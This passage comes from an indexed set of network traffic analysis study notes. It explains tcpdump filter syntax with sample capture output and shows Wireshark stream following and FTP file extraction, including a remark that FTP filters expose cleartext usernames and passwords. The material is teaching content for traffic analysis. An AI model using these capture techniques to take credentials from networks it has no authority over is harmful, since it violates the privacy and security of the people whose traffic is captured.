a23-54-168-81.deploy.static.akamaitechnologies.com.https: Flags [S], seq 777468939, win 64240, options [mss 1460,sackOK,TS val 1348555130 ecr 0,nop,wscale 7], length 0 15:18:15.021329 IP 172.16.146.2.49652 > 104.16.88.20.https: Flags [S], seq 1954080833, win 64240, options [mss 1460,sackOK,TS val 274098564 ecr 0,nop,wscale 7], length 0 15:18:15.022640 IP 172.16.146.2.45214 > 104.18.22.52.https: Flags [S], seq 1072203471, win 64240, options [mss 1460,sackOK,TS val 1445124063 ecr 0,nop,wscale 7], length 0 15:18:15.042399 IP 104.18.22.52.https > 172.16.146.2.45214: Flags [S.], seq 215464563, ack 1072203472, win 65535, options [mss 1400,nop,nop,sackOK,nop,wscale 10], length 0 15:18:15.043646 IP a23-54-168-81.deploy.static.akamaitechnologies.com.https > 172.16.146.2.60202: Flags [S.], seq 1390108870, ack 777468940, win 28960, options [mss 1460,sackOK,TS val 3405787409 ecr 1348555130,nop,wscale 7], length 0 15:18:15.044764 IP 104.16.88.20.https > 172.16.146.2.49652: Flags [S.], seq 2086758283, ack 1954080834, win 65535, options [mss 1400,nop,nop,sackOK,nop,wscale 10], length 0 15:18:16.131983 IP 172.16.146.2.45684 > ec2-34-255-145-175.eu-west-1.compute.amazonaws.com.https: Flags [S], seq 4017793011, win 64240, options [mss 1460,sackOK,TS val 933634389 ecr 0,nop,wscale 7], length 0 15:18:16.261855 IP ec2-34-255-145-175.eu-west-1.compute.amazonaws.com.https > 172.16.146.2.45684: Flags [S.], seq 106675091, ack 4017793012, win 26847, options [mss 1460,sackOK,TS val 12653884 ecr 933634389,nop,wscale 8], length 0 Protocol RFC Links Link Description IP Protocol RFC 791 describes IP and its functionality. ICMP Protocol RFC 792 describes ICMP and its functionality. TCP Protocol RFC 793 describes the TCP protocol and how it functions. UDP Protocol RFC 768 describes UDP and how it operates. RFC Quick Links This Wikipedia article contains a large list of protocols tied to the RFC that explains their implementation.","title":"Packet Filtering"},{"location":"network_traffic_analysis/tcpdump_packet_filtering/#helpful-tcpdump-filters","text":"Filter Result host host will filter visible traffic to show anything involving the designated host. Bi-directional src / dest src and dest are modifiers. We can use them to designate a source or destination host or port. net net will show us any traffic sourcing from or destined to the network designated. It uses / notation. proto will filter for a specific protocol type. (ether, TCP, UDP, and ICMP as examples) port port is bi-directional. It will show any traffic with the specified port as the source or destination. portrange portrange allows us to specify a range of ports. (0-1024) less / greater \"< >\" less and greater can be used to look for a packet or protocol option of a specific size. and / && and && can be used to concatenate two different filters together. for example, src host AND port. or or allows for a match on either of two conditions. It does not have to meet both. It can be tricky. not not is a modifier saying anything but x. For example, not UDP. **Host Filter **(whatever IP we input will be checked for in the source or destination IP field) hrmns@htb[/htb]$ ### Syntax: host [ IP ] hrmns@htb[/htb]$ sudo tcpdump -i eth0 host 172 .16.146.2 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes 14:50:53.072536 IP 172.16.146.2.48738 > ec2-52-31-199-148.eu-west-1.compute.amazonaws.com.https: Flags [P.], seq 3400465007:3400465044, ack 254421756, win 501, options [nop,nop,TS val 220968655 ecr 80852594], length 37 14:50:53.108740 IP 172.16.146.2.55606 > 172.67.1.1.https: Flags [P.], seq 4227143181:4227143273, ack 1980233980, win 21975, length 92 14:50:53.173084 IP 172.67.1.1.https > 172.16.146.2.55606: Flags [.], ack 92, win 69, length 0 14:50:53.175017 IP 172.16.146.2.35744 > 172.16.146.1.domain: 55991+ PTR? 148.199.31.52.in-addr.arpa. (44) 14:50:53.175714 IP 172.16.146.1.domain > 172.16.146.2.35744: 55991 1/0/0 PTR ec2-52-31-199-148.eu-west-1.compute.amazonaws.com. (107) Source/Destination Filter hrmns@htb[/htb]$ ### Syntax: src/dst [ host | net | port ] [ IP | Network Range | Port ] hrmns@htb[/htb]$ sudo tcpdump -i eth0 src host 172 .16.146.2 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes 14:53:36.199628 IP 172.16.146.2.48766 > ec2-52-31-199-148.eu-west-1.compute.amazonaws.com.https: Flags [P.], seq 1428378231:1428378268, ack 3778572066, win 501, options [nop,nop,TS val 221131782 ecr 80889856], length 37 14:53:36.203166 IP 172.16.146.2.55606 > 172.67.1.1.https: Flags [P.], seq 4227144035:4227144103, ack 1980235221, win 21975, length 68 14:53:36.267059 IP 172.16.146.2.36424 > 172.16.146.1.domain: 40873+ PTR? 148.199.31.52.in-addr.arpa. (44) 14:53:36.267880 IP 172.16.146.2.51151 > 172.16.146.1.domain: 10032+ PTR? 2.146.16.172.in-addr.arpa. (43) 14:53:36.276425 IP 172.16.146.2.46588 > 172.16.146.1.domain: 28357+ PTR? 1.1.67.172.in-addr.arpa. (41) 14:53:36.337722 IP 172.16.146.2.48766 > ec2-52-31-199-148.eu-west-1.compute.amazonaws.com.https: Flags [.], ack 34, win 501, options [nop,nop,TS val 221131920 ecr 80899875], length 0 14:53:36.338841 IP 172.16.146.2.48766 > ec2-52-31-199-148.eu-west-1.compute.amazonaws.com.https: Flags [.], ack 65, win 501, options [nop,nop,TS val 221131921 ecr 80899875], length 0 14:53:36.339273 IP 172.16.146.2.48766 > ec2-52-31-199-148.eu-west-1.compute.amazonaws.com.https: Flags [P.], seq 37:68, ack 66, win 501, options [nop,nop,TS val 221131922 ecr 80899875], length 31 14:53:36.339334 IP 172.16.146.2.48766 > ec2-52-31-199-148.eu-west-1.compute.amazonaws.com.https: Flags [F.], seq 68, ack 66, win 501, options [nop,nop,TS val 221131922 ecr 80899875], length 0 14:53:36.370791 IP 172.16.146.2.32972 > 172.16.146.1.domain: 3856+ PTR? 1.146.16.172.in-addr.arpa. (43) Utilizing Source With Port as a Filter hrmns@htb[/htb]$ sudo tcpdump -i eth0 tcp src port 80 06:17:08.222534 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [S.], seq 290218379, ack 951057940, win 5840, options [mss 1380,nop,nop,sackOK], length 0 06:17:08.783340 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [.], ack 480, win 6432, length 0 06:17:08.993643 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [.], seq 1:1381, ack 480, win 6432, length 1380: HTTP: HTTP/1.1 200 OK 06:17:09.123830 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [.], seq 1381:2761, ack 480, win 6432, length 1380: HTTP 06:17:09.754737 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [.], seq 2761:4141, ack 480, win 6432, length 1380: HTTP 06:17:09.864896 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [P.], seq 4141:5521, ack 480, win 6432, length 1380: HTTP 06:17:09.945011 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [.], seq 5521:6901, ack 480, win 6432, length 1380: HTTP Using Destination in Combination with the Net Filter (we are looking for anything destined for the 172.16.146.0/24 network) hrmns@htb[/htb]$ sudo tcpdump -i eth0 dest net 172 .16.146.2.0/24 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes 16:33:14.376003 IP 64.233.177.103.443 > 172.16.146.2.36050: Flags [.], ack 1486880537, win 316, options [nop,nop,TS val 2311579424 ecr 263866084], length 0 16:33:14.442123 IP 64.233.177.103.443 > 172.16.146.2.36050: Flags [P.], seq 0:385, ack 1, win 316, options [nop,nop,TS val 2311579493 ecr 263866084], length 385 16:33:14.442188 IP 64.233.177.103.443 > 172.16.146.2.36050: Flags [P.], seq 385:1803, ack 1, win 316, options [nop,nop,TS val 2311579493 ecr 263866084], length 1418 16:33:14.442223 IP 64.233.177.103.443 > 172.16.146.2.36050: Flags [.], seq 1803:4639, ack 1, win 316, options [nop,nop,TS val 2311579494 ecr 263866084], length 2836 16:33:14.443161 IP 64.233.177.103.443 > 172.16.146.2.36050: Flags [P.], seq 4639:5817, ack 1, win 316, options [nop,nop,TS val 2311579495 ecr 263866084], length 1178 16:33:14.443199 IP 64.233.177.103.443 > 172.16.146.2.36050: Flags [.], seq 5817:8653, ack 1, win 316, options [nop,nop,TS val 2311579495 ecr 263866084], length 2836 16:33:14.444407 IP 64.233.177.103.443 > 172.16.146.2.36050: Flags [.], seq 8653:10071, ack 1, win 316, options [nop,nop,TS val 2311579497 ecr 263866084], length 1418 16:33:14.445479 IP 64.233.177.103.443 > 172.16.146.2.36050: Flags [.], seq 10071:11489, ack 1, win 316, options [nop,nop,TS val 2311579497 ecr 263866084], length 1418 16:33:14.445531 IP 64.233.177.103.443 > 172.16.146.2.36050: Flags [.], seq 11489:12907, ack 1, win 316, options [nop,nop,TS val 2311579498 ecr 263866084], length 1418 16:33:14.446955 IP 64.233.177.103.443 > 172.16.146.2.36050: Flags [.], seq 12907:14325, ack 1, win 316, options [nop,nop,TS val 2311579498 ecr 263866084], length 1418 Protocol Filter hrmns@htb[/htb]$ ### Syntax: [ tcp/udp/icmp ] hrmns@htb[/htb]$ sudo tcpdump -i eth0 udp 06:17:09.864896 IP dialin-145-254-160-237.pools.arcor-ip.net.3009 > 145.253.2.203.domain: 35+ A? pagead2.googlesyndication.com. (47) 06:17:10.225414 IP 145.253.2.203.domain > dialin-145-254-160-237.pools.arcor-ip.net.3009: 35 4/0/0 CNAME pagead2.google.com., CNAME pagead.google.akadns.net., A 216.239.59.104, A 216.239.59.99 (146) Protocol Number Filter ( resource for a helpful list covering protocol numbers) hrmns@htb[/htb]$ ### Syntax: proto [ protocol number ] hrmns@htb[/htb]$ sudo tcpdump -i eth0 proto 17 06:17:09.864896 IP dialin-145-254-160-237.pools.arcor-ip.net.3009 > 145.253.2.203.domain: 35+ A? pagead2.googlesyndication.com. (47) 06:17:10.225414 IP 145.253.2.203.domain > dialin-145-254-160-237.pools.arcor-ip.net.3009: 35 4/0/0 CNAME pagead2.google.com., CNAME pagead.google.akadns.net., A 216.239.59.104, A 216.239.59.99 (146) Port Filter hrmns@htb[/htb]$ ### Syntax: port [ port number ] hrmns@htb[/htb]$ sudo tcpdump -i eth0 tcp port 443 06:17:07.311224 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [S], seq 951057939, win 8760, options [mss 1460,nop,nop,sackOK], length 0 06:17:08.222534 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [S.], seq 290218379, ack 951057940, win 5840, options [mss 1380,nop,nop,sackOK], length 0 06:17:08.222534 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [.], ack 1, win 9660, length 0 06:17:08.222534 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [P.], seq 1:480, ack 1, win 9660, length 479: HTTP: GET /download.html HTTP/1.1 06:17:08.783340 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [.], ack 480, win 6432, length 0 06:17:08.993643 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [.], seq 1:1381, ack 480, win 6432, length 1380: HTTP: HTTP/1.1 200 OK 06:17:09.123830 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [.], ack 1381, win 9660, length 0 06:17:09.123830 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [.], seq 1381:2761, ack 480, win 6432, length 1380: HTTP 06:17:09.324118 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [.], ack 2761, win 9660, length 0 06:17:09.754737 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [.], seq 2761:4141, ack 480, win 6432, length 1380: HTTP 06:17:09.864896 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [P.], seq 4141:5521, ack 480, win 6432, length 1380: HTTP 06:17:09.864896 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [.], ack 5521, win 9660, length 0 06:17:09.945011 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [.], seq 5521:6901, ack 480, win 6432, length 1380: HTTP 06:17:10.125270 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [.], ack 6901, win 9660, length 0 06:17:10.205385 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [.], seq 6901:8281, ack 480, win 6432, length 1380: HTTP 06:17:10.295515 IP dialin-145-254-160-237.pools.arcor-ip.net.3371 > 216.239.59.99.http: Flags [P.], seq 918691368:918692089, ack 778785668, win 8760, length 721: HTTP: GET /pagead/ads?client=ca-pub-2309191948673629&random=1084443430285&lmt=1082467020&format=468x60_as&output=html&url=http%3A%2F%2Fwww.ethereal.com%2Fdownload.html&color_bg=FFFFFF&color_text=333333&color_link=000000&color_url=666633&color_border=666633 HTTP/1.1 Port Range Filter hrmns@htb[/htb]$ ### Syntax: portrange [ portrange 0 -65535 ] hrmns@htb[/htb]$ sudo tcpdump -i eth0 portrange 0 -1024 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes 13:10:35.092477 IP 172.16.146.1.domain > 172.16.146.2.32824: 47775 1/0/0 CNAME autopush.prod.mozaws.net. (81) 13:10:35.093217 IP 172.16.146.2.48078 > 172.16.146.1.domain: 30234+ A? ocsp.pki.goog. (31) 13:10:35.093334 IP 172.16.146.2.48078 > 172.16.146.1.domain: 32024+ AAAA? ocsp.pki.goog. (31) 13:10:35.136255 IP 172.16.146.1.domain > 172.16.146.2.48078: 32024 2/0/0 CNAME pki-goog.l.google.com., AAAA 2607:f8b0:4002:c09::5e (94) 13:10:35.137348 IP 172.16.146.1.domain > 172.16.146.2.48078: 30234 2/0/0 CNAME pki-goog.l.google.com., A 172.217.164.67 (82) 13:10:35.137989 IP 172.16.146.2.55074 > atl26s18-in-f3.1e100.net.http: Flags [S], seq 1146136517, win 64240, options [mss 1460,sackOK,TS val 1337520268 ecr 0,nop,wscale 7], length 0 13:10:35.174443 IP atl26s18-in-f3.1e100.net.http > 172.16.146.2.55074: Flags [S.], seq 345110814, ack 1146136518, win 65535, options [mss 1430,sackOK,TS val 1000152427 ecr 1337520268,nop,wscale 8], length 0 13:10:35.174481 IP 172.16.146.2.55074 > atl26s18-in-f3.1e100.net.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 1337520304 ecr 1000152427], length 0 13:10:35.174716 IP 172.16.146.2.55074 > atl26s18-in-f3.1e100.net.http: Flags [P.], seq 1:379, ack 1, win 502, options [nop,nop,TS val 1337520305 ecr 1000152427], length 378: HTTP: POST /gts1o1core HTTP/1.1 13:10:35.208007 IP atl26s18-in-f3.1e100.net.http > 172.16.146.2.55074: Flags [.], ack 379, win 261, options [nop,nop,TS val 1000152462 ecr 1337520305], length 0 Less/Greater Filter (Looking for any packet less than 64 bytes. If we are looking to capture traffic that includes a file transfer or set of files. We know these files will be larger than regular traffic) hrmns@htb[/htb]$ ### Syntax: less/greater [ size in bytes ] hrmns@htb[/htb]$ sudo tcpdump -i eth0 less 64 06:17:07.311224 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [S], seq 951057939, win 8760, options [mss 1460,nop,nop,sackOK], length 0 06:17:08.222534 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [S.], seq 290218379, ack 951057940, win 5840, options [mss 1380,nop,nop,sackOK], length 0 06:17:08.222534 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [.], ack 1, win 9660, length 0 06:17:08.783340 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [.], ack 480, win 6432, length 0 06:17:09.123830 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [.], ack 1381, win 9660, length 0 06:17:09.324118 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [.], ack 2761, win 9660, length 0 06:17:09.864896 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [.], ack 5521, win 9660, length 0 06:17:10.125270 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [.], ack 6901, win 9660, length 0 06:17:10.325558 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [.], ack 8281, win 9660, length 0 06:17:10.806249 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [.], ack 11041, win 9660, length 0 06:17:10.956465 IP 216.239.59.99.http > dialin-145-254-160-237.pools.arcor-ip.net.3371: Flags [.], ack 918692089, win 31460, length 0 06:17:11.126710 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [.], ack 12421, win 9660, length 0 06:17:11.266912 IP dialin-145-254-160-237.pools.arcor-ip.net.3371 > 216.239.59.99.http: Flags [.], ack 1590, win 8760, length 0 06:17:11.527286 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [.], ack 13801, win 9660, length 0 06:17:11.667488 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [.], ack 16561, win 9660, length 0 06:17:11.807689 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [.], ack 17941, win 9660, length 0 06:17:12.088092 IP dialin-145-254-160-237.pools.arcor-ip.net.3371 > 216.239.59.99.http: Flags [.], ack 1590, win 8760, length 0 06:17:12.328438 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [.], ack 18365, win 9236, length 0 06:17:25.216971 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [F.], seq 18365, ack 480, win 6432, length 0 06:17:25.216971 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [.], ack 18366, win 9236, length 0 06:17:37.374452 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [F.], seq 480, ack 18366, win 9236, length 0 06:17:37.704928 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [.], ack 481, win 6432, length 0 Utilizing Greater hrmns@htb[/htb]$ sudo tcpdump -i eth0 greater 500 21:12:43.548353 IP 192.168.0.1.telnet > 192.168.0.2.1550: Flags [P.], seq 401695766:401696254, ack 2579866052, win 17376, options [nop,nop,TS val 2467382 ecr 10234152], length 488 E...;...@.................d.......C........ .%.6..)(Warning: no Kerberos tickets issued. OpenBSD 2.6-beta (OOF) #4: Tue Oct 12 20:42:32 CDT 1999 Welcome to OpenBSD: The proactively secure Unix-like operating system. Please use the sendbug(1) utility to report bugs in the system. Before reporting a bug, please try to reproduce it with the latest version of the code. With bug reports, please try to ensure that enough information to reproduce the problem is enclosed, and if a known fix for it exists, include that as well. AND Filter hrmns@htb[/htb]$ ### Syntax: and [ requirement ] hrmns@htb[/htb]$ sudo tcpdump -i eth0 host 192 .168.0.1 and port 23 21:12:38.387203 IP 192.168.0.2.1550 > 192.168.0.1.telnet: Flags [S], seq 2579865836, win 32120, options [mss 1460,sackOK,TS val 10233636 ecr 0,nop,wscale 0], length 0 21:12:38.389728 IP 192.168.0.1.telnet > 192.168.0.2.1550: Flags [S.], seq 401695549, ack 2579865837, win 17376, options [mss 1448,nop,wscale 0,nop,nop,TS val 2467372 ecr 10233636], length 0 21:12:38.389775 IP 192.168.0.2.1550 > 192.168.0.1.telnet: Flags [.], ack 1, win 32120, options [nop,nop,TS val 10233636 ecr 2467372], length 0 21:12:38.391363 IP 192.168.0.2.1550 > 192.168.0.1.telnet: Flags [P.], seq 1:28, ack 1, win 32120, options [nop,nop,TS val 10233636 ecr 2467372], length 27 [telnet DO SUPPRESS GO AHEAD, WILL TERMINAL TYPE, WILL NAWS, WILL TSPEED, WILL LFLOW, WILL LINEMODE, WILL NEW-ENVIRON, DO STATUS, WILL XDISPLOC] 21:12:38.537538 IP 192.168.0.1.telnet > 192.168.0.2.1550: Flags [P.], seq 1:4, ack 28, win 17349, options [nop,nop,TS val 2467372 ecr 10233636], length 3 [telnet DO AUTHENTICATION] OR Filter hrmns@htb[/htb]$ ### Syntax: or/ || [ requirement ] hrmns@htb[/htb]$ sudo tcpdump -r sus.pcap icmp or host 172 .16.146.1 reading from file sus.pcap, link-type EN10MB (Ethernet), snapshot length 262144 14:54:03.659163 IP 172.16.146.2 > dns.google: ICMP echo request, id 51661, seq 21, length 64 14:54:03.691278 IP dns.google > 172.16.146.2: ICMP echo reply, id 51661, seq 21, length 64 14:54:03.879882 ARP, Request who-has 172.16.146.1 tell 172.16.146.2, length 28 14:54:03.880266 ARP, Reply 172.16.146.1 is-at 8a:66:5a:11:8d:64 (oui Unknown), length 46 14:54:04.661179 IP 172.16.146.2 > dns.google: ICMP echo request, id 51661, seq 22, length 64 14:54:04.687120 IP dns.google > 172.16.146.2: ICMP echo reply, id 51661, seq 22, length 64 14:54:05.663097 IP 172.16.146.2 > dns.google: ICMP echo request, id 51661, seq 23, length 64 14:54:05.686092 IP dns.google > 172.16.146.2: ICMP echo reply, id 51661, seq 23, length 64 14:54:06.664174 IP 172.16.146.2 > dns.google: ICMP echo request, id 51661, seq 24, length 64 14:54:06.697469 IP dns.google > 172.16.146.2: ICMP echo reply, id 51661, seq 24, length 64 14:54:07.666273 IP 172.16.146.2 > dns.google: ICMP echo request, id 51661, seq 25, length 64 14:54:07.701475 IP dns.google > 172.16.146.2: ICMP echo reply, id 51661, seq 25, length 64 14:54:08.668364 IP 172.16.146.2 > dns.google: ICMP echo request, id 51661, seq 26, length 64 14:54:08.694948 IP dns.google > 172.16.146.2: ICMP echo reply, id 51661, seq 26, length 64 14:54:09.670523 IP 172.16.146.2 > dns.google: ICMP echo request, id 51661, seq 27, length 64 14:54:09.694974 IP dns.google > 172.16.146.2: ICMP echo reply, id 51661, seq 27, length 64 14:54:10.672858 IP 172.16.146.2 > dns.google: ICMP echo request, id 51661, seq 28, length 64 14:54:10.697834 IP dns.google > 172.16.146.2: ICMP echo reply, id 51661, seq 28, length 64 NOT Filter hrmns@htb[/htb]$ ### Syntax: not/! [ requirement ] hrmns@htb[/htb]$ sudo tcpdump -r sus.pcap not icmp 14:54:03.879882 ARP, Request who-has 172.16.146.1 tell 172.16.146.2, length 28 14:54:03.880266 ARP, Reply 172.16.146.1 is-at 8a:66:5a:11:8d:64 (oui Unknown), length 46 14:54:16.541657 IP 172.16.146.2.55592 > ec2-52-211-164-46.eu-west-1.compute.amazonaws.com.https: Flags [P.], seq 3569937476:3569937513, ack 2948818703, win 501, options [nop,nop,TS val 713252991 ecr 12282469], length 37 14:54:16.568659 IP 172.16.146.2.53329 > 172.16.146.1.domain: 24866+ A? app.hackthebox.eu. (35) 14:54:16.616032 IP 172.16.146.1.domain > 172.16.146.2.53329: 24866 3/0/0 A 172.67.1.1, A 104.20.66.68, A 104.20.55.68 (83) 14:54:16.616396 IP 172.16.146.2.56204 > 172.67.1.1.https: Flags [S], seq 2697802378, win 64240, options [mss 1460,sackOK,TS val 533261003 ecr 0,nop,wscale 7], length 0 14:54:16.637895 IP 172.67.1.1.https > 172.16.146.2.56204: Flags [S.], seq 752000032, ack 2697802379, win 65535, options [mss 1400,nop,nop,sackOK,nop,wscale 10], length 0 14:54:16.637937 IP 172.16.146.2.56204 > 172.67.1.1.https: Flags [.], ack 1, win 502, length 0 14:54:16.644551 IP 172.16.146.2.56204 > 172.67.1.1.https: Flags [P.], seq 1:514, ack 1, win 502, length 513 14:54:16.667236 IP 172.67.1.1.https > 172.16.146.2.56204: Flags [.], ack 514, win 66, length 0 14:54:16.668307 IP 172.67.1.1.https > 172.16.146.2.56204: Flags [P.], seq 1:2766, ack 514, win 66, length 2765 14:54:16.668319 IP 172.16.146.2.56204 > 172.67.1.1.https: Flags [.], ack 2766, win 496, length 0 14:54:16.670536 IP ec2-52-211-164-46.eu-west-1.compute.amazonaws.com.https > 172.16.146.2.55592: Flags [P.], seq 1:34, ack 37, win 114, options [nop,nop,TS val 12294021 ecr 713252991], length 33 14:54:16.670559 IP 172.16.146.2.55592 > ec2-52-211-164-46.eu-west-1.compute.amazonaws.com.https: Flags [.], ack 34, win 501, options [nop,nop,TS val 713253120 ecr 12294021], length 0 Piping a Capture to Grep hrmns@htb[/htb]$ sudo tcpdump -Ar http.cap -l | grep 'mailto:*' reading from file http.cap, link-type EN10MB (Ethernet), snapshot length 65535 <a href=\"mailto:ethereal-web[AT]ethereal.com\">ethereal-web[AT]ethereal.com</a> <a href=\"mailto:free-support[AT]thewrittenword.com\">free-support[AT]thewrittenword.com</a> <a href=\"mailto:ethereal-users[AT]ethereal.com\">ethereal-users[AT]ethereal.com</a> <a href=\"mailto:ethereal-web[AT]ethereal.com\">ethereal-web[AT]ethereal.com</a> Looking for TCP Protocol Flags hrmns@htb[/htb]$ tcpdump -i eth0 'tcp[13] & 2 != 0' Hunting For a SYN Flag hrmns@htb[/htb]$ sudo tcpdump -i eth0 'tcp[13] &2 != 0' tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes 15:18:14.630993 IP 172.16.146.2.56244 > 172.67.1.1.https: Flags [S], seq 122498858, win 64240, options [mss 1460,sackOK,TS val 534699017 ecr 0,nop,wscale 7], length 0 15:18:14.654698 IP 172.67.1.1.https > 172.16.146.2.56244: Flags [S.], seq 3728841459, ack 122498859, win 65535, options [mss 1400,nop,nop,sackOK,nop,wscale 10], length 0 15:18:15.017464 IP 172.16.146.2.60202 > a23-54-168-81.deploy.static.akamaitechnologies.com.https: Flags [S], seq 777468939, win 64240, options [mss 1460,sackOK,TS val 1348555130 ecr 0,nop,wscale 7], length 0 15:18:15.021329 IP 172.16.146.2.49652 > 104.16.88.20.https: Flags [S], seq 1954080833, win 64240, options [mss 1460,sackOK,TS val 274098564 ecr 0,nop,wscale 7], length 0 15:18:15.022640 IP 172.16.146.2.45214 > 104.18.22.52.https: Flags [S], seq 1072203471, win 64240, options [mss 1460,sackOK,TS val 1445124063 ecr 0,nop,wscale 7], length 0 15:18:15.042399 IP 104.18.22.52.https > 172.16.146.2.45214: Flags [S.], seq 215464563, ack 1072203472, win 65535, options [mss 1400,nop,nop,sackOK,nop,wscale 10], length 0 15:18:15.043646 IP a23-54-168-81.deploy.static.akamaitechnologies.com.https > 172.16.146.2.60202: Flags [S.], seq 1390108870, ack 777468940, win 28960, options [mss 1460,sackOK,TS val 3405787409 ecr 1348555130,nop,wscale 7], length 0 15:18:15.044764 IP 104.16.88.20.https > 172.16.146.2.49652: Flags [S.], seq 2086758283, ack 1954080834, win 65535, options [mss 1400,nop,nop,sackOK,nop,wscale 10], length 0 15:18:16.131983 IP 172.16.146.2.45684 > ec2-34-255-145-175.eu-west-1.compute.amazonaws.com.https: Flags [S], seq 4017793011, win 64240, options [mss 1460,sackOK,TS val 933634389 ecr 0,nop,wscale 7], length 0 15:18:16.261855 IP ec2-34-255-145-175.eu-west-1.compute.amazonaws.com.https > 172.16.146.2.45684: Flags [S.], seq 106675091, ack 4017793012, win 26847, options [mss 1460,sackOK,TS val 12653884 ecr 933634389,nop,wscale 8], length 0 Protocol RFC Links Link Description IP Protocol RFC 791 describes IP and its functionality. ICMP Protocol RFC 792 describes ICMP and its functionality. TCP Protocol RFC 793 describes the TCP protocol and how it functions. UDP Protocol RFC 768 describes UDP and how it operates. RFC Quick Links This Wikipedia article contains a large list of protocols tied to the RFC that explains their implementation.","title":"Helpful TCPDump Filters"},{"location":"network_traffic_analysis/wireshark_advanced_usage/","text":"Statistics Tab \u00b6 Analyze \u00b6 From the Analyze tab, we can utilize plugins that allow us to do things such as following TCP streams, filter on conversation types, prepare new packet filters and examine the expert info Wireshark generates about the traffic. Following TCP Streams Wireshark can stitch TCP packets back together to recreate the entire stream in a readable format. This ability also allows us to pull data ( images, files, etc. ) out of the capture. This works for almost any protocol that utilizes TCP as a transport mechanism. To utilize this feature: right-click on a packet from the stream we wish to recreate. select follow \u2192 TCP this will open a new window with the stream stitched back together. From here, we can see the entire conversation. Alternatively, we can utilize the filter tcp.stream eq # to find and track conversations captured in the pcap file. Notice that the first three packets in the image above have a full TCP handshake. Following those packets, we can see the stream transferring data. We have cleared anything not related out of view by utilizing the filter, and we now can see the conversation in order. Extracting FIles from the GUI \u00b6 Another exciting way to grab data out of the pcap file comes from FTP. * ftp - Will display anything about the FTP protocol. FTP Disector ftp.request.command - Will show any commands sent across the ftp-control channel ( port 21 ) We can look for information like usernames and passwords with this filter. It can also show us filenames for anything requested. ftp-data - Will show any data transferred over the data channel ( port 20 ) If we filter on a conversation and utilize ftp-data , we can capture anything sent during the conversation. We can reconstruct anything transferred by placing the raw data back into a new file and naming it appropriately.","title":"Advanced Usage"},{"location":"network_traffic_analysis/wireshark_advanced_usage/#statistics-tab","text":"","title":"Statistics Tab"},{"location":"network_traffic_analysis/wireshark_advanced_usage/#analyze","text":"From the Analyze tab, we can utilize plugins that allow us to do things such as following TCP streams, filter on conversation types, prepare new packet filters and examine the expert info Wireshark generates about the traffic. Following TCP Streams Wireshark can stitch TCP packets back together to recreate the entire stream in a readable format. This ability also allows us to pull data ( images, files, etc. ) out of the capture. This works for almost any protocol that utilizes TCP as a transport 